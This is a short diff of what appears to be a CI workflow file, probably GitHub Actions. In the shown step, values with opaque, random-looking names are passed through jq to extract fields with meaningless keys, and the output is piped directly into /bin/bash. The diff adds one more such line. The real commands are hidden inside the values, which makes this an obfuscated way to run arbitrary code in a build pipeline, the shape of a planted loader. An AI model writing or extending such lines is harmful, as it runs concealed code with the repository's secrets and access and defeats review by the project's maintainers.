@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$f0904" | jq -r .d55327 | /bin/bash
           echo $gh0 | jq -r .qje8767 | /bin/bash
           printf '%s' "$eh8360" | jq -r .tpoma76 | /bin/bash
+          echo $l94 | jq -r .d415 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
